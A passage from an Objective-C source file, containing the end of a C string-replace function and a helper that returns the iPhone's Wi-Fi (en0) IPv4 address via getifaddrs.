    int len_front; // distance between rep and end of last rep
    int count;    // number of replacements
    
    if (!orig)
        return NULL;
    if (!rep)
        rep = "";
    len_rep = (int)strlen(rep);
    if (!with)
        with = "";
    len_with = (int)strlen(with);
    
    ins = orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }
    
    // first time through the loop, all the variable are set correctly
    // from here on,
    //    tmp points to the end of the result string
    //    ins points to the next occurrence of rep in orig
    //    orig points to the remainder of orig after "end of rep"
    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
    
    if (!result)
        return NULL;
    
    while (count--) {
        ins = strstr(orig, rep);
        len_front = (int)(ins - orig);
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep; // move to next "end of rep"
    }
    strcpy(tmp, orig);
    return result;
}

static NSString *currentIPAddress() {
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    NSString *address = nil;
    
    // retrieve the current interfaces - returns 0 on success
    if(!getifaddrs(&interfaces)) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            sa_family_t sa_type = temp_addr->ifa_addr->sa_family;
            if(sa_type == AF_INET) {
                NSString *name = [NSString stringWithUTF8String:temp_addr->ifa_name];
                NSString *addr = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)]; // pdp_ip0
                //NSLog(@"NAME: \"%@\" addr: %@", name, addr); // see for yourself
                
                if([name isEqualToString:@"en0"]) {
                    // Interface is the wifi connection on the iPhone
                    address = addr;
                    break;
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
        // Free memory
        freeifaddrs(interfaces);
    }
    
    if(address == nil)
        errno = EFAULT; /* Bad address */
    
    return address;
}

@end
